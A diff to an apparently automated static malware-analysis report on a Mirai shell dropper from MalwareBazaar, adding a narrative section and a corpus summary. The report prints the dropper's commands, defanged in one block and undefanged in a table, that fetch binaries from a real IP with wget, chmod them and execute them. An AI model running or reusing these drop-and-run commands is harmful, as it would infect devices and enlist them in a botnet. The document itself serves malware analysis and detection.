@@ -1,8 +1,32 @@
-# Single-Sample Static Malware Analysis - `8985fe09d5b08240`
+# Storytime: Dissecting a Mirai SH dropper
+
+> **Source:** [MalwareBazaar](https://bazaar.abuse.ch/sample/8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9/) · **SHA-256** `8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9` · **Family** `Mirai` · **Static analysis only — the sample was never run.**
+
+## The Story
+
+It showed up on MalwareBazaar as a 391-byte `sh` file, tagged `Mirai`. We pulled exactly one copy into quarantine, cracked open the password-protected archive, and read the bytes as inert text. Nothing here was executed — every claim below comes from reading the code, not running it. Here is what it was hiding.
+
+## First Contact — The Code As It Arrived
+
+Straight out of the archive, a portion of the sample looks like this (defanged):
+
+```shell
+cd /var
+rm arm* mips mipsel
+wget hxxp://217[.]60[.]195[.]160/gigatex/arm; chmod 777 arm; ./arm gentech
+wget hxxp://217[.]60[.]195[.]160/gigatex/arm5; chmod 777 arm5; ./arm5 gentech
+wget hxxp://217[.]60[.]195[.]160/gigatex/arm7; chmod 777 arm7; ./arm7 gentech
+wget hxxp://217[.]60[.]195[.]160/gigatex/mips; chmod 777 mips; ./mips gentech
+wget hxxp://217[.]60[.]195[.]160/gigatex/mipsel; chmod 777 mipsel; ./mipsel gentech
+```
+
+## What It Wants To Do
+
+The behaviour that matters, recovered from the (deobfuscated) code: `shell_dropper`. It pulls follow-on payloads down with a shell download tool, makes them executable, and launches them — a classic drop-and-run loader.
 
 ## Executive Summary
 
-The agent selected one MalwareBazaar submission and performed static analysis on that single artifact. The sample was not executed, loaded, imported, or dynamically tested. Static evidence produced 9 IOCs and 2 code/string findings.
+One MalwareBazaar submission, analyzed statically — never executed, loaded, imported, or dynamically tested. Static evidence produced 9 IOCs and 2 code/string findings.
 
 ## What The Agent Did
 
@@ -67,6 +91,15 @@ These strings were selected because they contain network indicators or suspiciou
 | `wget http://217.60.195.160/gigatex/arm7; chmod 777 arm7; ./arm7 gentech` |
 | `wget http://217.60.195.160/gigatex/mips; chmod 777 mips; ./mips gentech` |
 | `wget http://217.60.195.160/gigatex/mipsel; chmod 777 mipsel; ./mipsel gentech` |
+
+## What We've Learned So Far
+
+How this sample sits against everything the loop has analyzed before:
+
+- Corpus before this sample: **1** prior sample(s).
+- First time the loop has seen the `Mirai` family.
+- No overlap with earlier samples yet — this one expands the knowledge base.
+
 
 ## YARA Rules
 
